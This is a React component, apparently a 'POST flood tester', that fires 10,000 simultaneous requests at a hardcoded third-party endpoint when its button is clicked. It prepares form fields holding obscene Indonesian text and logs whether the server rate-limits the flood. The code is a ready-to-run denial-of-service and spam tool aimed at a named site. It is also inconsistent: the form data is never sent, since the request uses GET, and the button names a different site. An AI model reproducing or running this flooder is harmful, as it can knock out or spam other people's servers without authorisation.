import React from "react";

const PostFloodTester: React.FC = () => {
  const handlePostFlood = async () => {
  const totalRequest = 10000;     // Total request yang mau dikirim
  const concurrency = 10000;       // Maksimal request yang berjalan paralel
  const ajaxUrl = "https://dododolan.com/get_transaction_detail.php";
  const nonce = "20dfddfe5c";

  // Fungsi kirim satu POST request ke server
  const sendPost = async (i:any) => {
    const formData = new FormData();
    formData.append("action", "POST");
    formData.append("nonce", nonce);
    formData.append("nama", `kwontol ${i}`);
    formData.append("pesan", `memek`);

    try {
      const res = await fetch(ajaxUrl, {
        method: "GET"
      });

      if (res.status === 429) {
        console.warn(`❌ [${i}] Ditolak: Rate Limit`);
      } else {
        console.log(`✅ [${i}] Berhasil:`, res.status);
      }
    } catch (e) {
      console.error(`🔥 [${i}] Gagal kirim POST:`, e);
    }
  };

  // Buat array berisi angka 0 sampai totalRequest-1
  const indices = Array.from({ length: totalRequest }, (_, i) => i);

  // Proses request secara batch sesuai concurrency limit
  for (let i = 0; i < indices.length; i += concurrency) {
    // Ambil batch sebanyak concurrency
    const batch = indices.slice(i, i + concurrency);

    // Jalankan batch secara paralel (Promise.all)
    await Promise.all(batch.map(sendPost));
    // Setelah batch selesai, baru lanjut batch berikutnya
  }

  console.log("Semua request sudah selesai.");
};


  return (
    <div className="p-4">
      <button
        onClick={handlePostFlood}
        className="px-4 py-2 bg-yellow-600 text-white rounded hover:bg-yellow-700 transition"
      >
        Tes POST ke hexanest.id 🚀
      </button>
    </div>
  );
};

export default PostFloodTester;
